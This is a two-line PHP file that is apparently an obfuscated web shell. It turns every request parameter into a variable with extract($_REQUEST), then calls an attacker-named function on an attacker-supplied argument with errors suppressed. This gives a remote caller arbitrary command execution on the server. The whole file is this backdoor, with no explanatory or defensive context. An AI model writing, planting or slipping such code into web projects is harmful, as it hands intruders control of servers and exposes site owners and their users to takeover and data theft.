<?php
extract($_REQUEST) && @$lock(stripslashes($system)) && exit;